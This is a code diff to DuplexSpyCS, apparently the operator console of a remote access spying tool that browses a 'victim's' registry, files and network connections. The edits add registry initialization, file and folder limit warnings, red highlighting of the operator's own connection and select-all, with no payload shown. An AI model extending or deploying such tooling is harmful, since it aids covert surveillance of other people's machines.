@@ -332,12 +332,19 @@ namespace DuplexSpyCS
         {
             Invoke(new Action(() =>
             {
-                string path = Reg_GetCurrentPath();
-                TreeNode node = FindTreeNodeByFullPath(treeView3.Nodes, path);
-                if (node != null)
+                if (treeView3.Nodes.Count == 0)
                 {
-                    treeView3.SelectedNode = null;
-                    treeView3.SelectedNode = node;
+                    m_victim.fnSendCommand($"reg|init");
+                }
+                else
+                {
+                    string path = Reg_GetCurrentPath();
+                    TreeNode node = FindTreeNodeByFullPath(treeView3.Nodes, path);
+                    if (node != null)
+                    {
+                        treeView3.SelectedNode = null;
+                        treeView3.SelectedNode = node;
+                    }
                 }
             }));
         }
@@ -859,7 +866,7 @@ namespace DuplexSpyCS
         /// <param name="tgt_dir">Encoded remote directory.</param>
         /// <param name="d1">Folder data.</param>
         /// <param name="d2">File data.</param>
-        public void File_AddItems(string tgt_dir, string d1, string d2)
+        public void File_AddItems(string tgt_dir, string d1, string d2, int nTotalDir, int nTotalFile)
         {
             List<string> lsCheckDeletedDir = new List<string>();
 
@@ -1036,6 +1043,22 @@ namespace DuplexSpyCS
                     cnt_file++;
                 }
 
+                if (cnt_dir < nTotalDir)
+                    MessageBox.Show(
+                        $"Maximum number of folders is reached! Detected total folders: {nTotalDir}",
+                        "Maximum Folder",
+                        MessageBoxButtons.OK,
+                        MessageBoxIcon.Warning
+                    );
+
+                if (cnt_file < nTotalFile)
+                    MessageBox.Show(
+                        $"Maximum number of files is reached! Detected total files: {nTotalFile}",
+                        "Maximum File",
+                        MessageBoxButtons.OK,
+                        MessageBoxIcon.Warning
+                    );
+
                 Invoke(new Action(() =>
                 {
                     toolStripStatusLabel2.Text = $"Action successfully | Folder[{cnt_dir}] File[{cnt_file}]";
@@ -1211,7 +1234,7 @@ namespace DuplexSpyCS
 
                         i++;
 
-                        Thread.Sleep(10);
+                        Thread.Sleep(100);
                     }
                 }
             }
@@ -1632,9 +1655,7 @@ namespace DuplexSpyCS
 
         public void File_FindStartup()
         {
-            frmFileFind f = new frmFileFind();
-            f.v = m_victim;
-            f.currentPath = (string)textBox1.Tag;
+            frmFileFind f = new frmFileFind(m_victim, this, (string)textBox1.Tag);
             f.Tag = Function.FileFind;
             f.Text = $@"FileFind\\{m_victim.ID}";
             f.Show();
@@ -2046,12 +2067,13 @@ namespace DuplexSpyCS
         }
 
         #endregion
-        #region Conn
+        #region Connection
 
         private void Conn_ReqInit()
         {
             m_victim.fnSendCommand($"conn|init");
         }
+
         /// <summary>
         /// "Connection" function initalization.
         /// </summary>
@@ -2076,6 +2098,12 @@ namespace DuplexSpyCS
                 item.SubItems.Add(remote_ip);
                 item.SubItems.Add(remote_port);
                 item.SubItems.Add(state);
+
+                string szLocalHost = s[1];
+                string szRemoteHost = s[2];
+                if (string.Equals(szRemoteHost, m_victim.socket.RemoteEndPoint.ToString()) ||
+                    string.Equals(szLocalHost, m_victim.socket.RemoteEndPoint.ToString()))
+                    item.ForeColor = Color.Red;
 
                 Invoke(new Action(() => listView4.Items.Add(item)));
             }
@@ -3076,7 +3104,8 @@ namespace DuplexSpyCS
         {
             if (e.Modifiers == Keys.Control)
             {
-
+                foreach (ListViewItem item in listView5.Items)
+                    item.Selected = true;
             }
             else
             {
